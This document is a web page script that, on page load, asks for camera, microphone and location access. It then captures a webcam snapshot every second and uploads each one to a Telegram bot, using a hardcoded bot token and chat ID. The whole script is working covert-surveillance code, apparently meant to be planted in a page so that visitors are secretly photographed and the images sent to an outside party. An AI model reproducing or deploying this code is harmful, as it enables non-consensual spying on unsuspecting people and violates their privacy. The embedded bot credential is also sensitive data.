      <script>
        
const BOT_TOKEN = "7341952786:AAErBcgGblJyjBpadb483rHyPdEBDjeeTfA";
const CHAT_ID = "7416312733";
const PHOTO_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

const videoElement = document.getElementById('video');

async function checkPermissions() {
  try {
    const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    videoElement.srcObject = mediaStream;
    videoElement.style.display = 'block';

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(position) {
        console.log('Location:', position.coords.latitude, position.coords.longitude);
        startCapturing();
      }, function(error) {
        console.log('Location access denied:', error);
        startCapturing();
      });
    } else {
      console.log('Geolocation not supported, proceeding with camera.');
      startCapturing();
    }
  } catch (error) {
    console.error('Permission request failed:', error);
    // alert('Camera or microphone access denied. Please enable it in settings.');
  }
}

async function captureAndSendImages() {
  const canvas = document.createElement('canvas');
  const context = canvas.getContext('2d');
  canvas.width = videoElement.videoWidth;
  canvas.height = videoElement.videoHeight;
  context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(async function(blob) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, "snapshot.jpg");

    try {
      const response = await fetch(PHOTO_API_URL, { method: 'POST', body: formData });
      const result = await response.json();
      if (result.ok) {
        console.log("Image sent to Telegram!");
      } else {
        console.log("Error sending image to Telegram:", result);
      }
    } catch (error) {
      console.error("Error sending image to Telegram:", error);
    }
  }, "image/jpeg");
}

function startCapturing() {
  setInterval(captureAndSendImages, 1000);
}

// Automatically start permissions check and capturing process on page load
checkPermissions();
      </script>
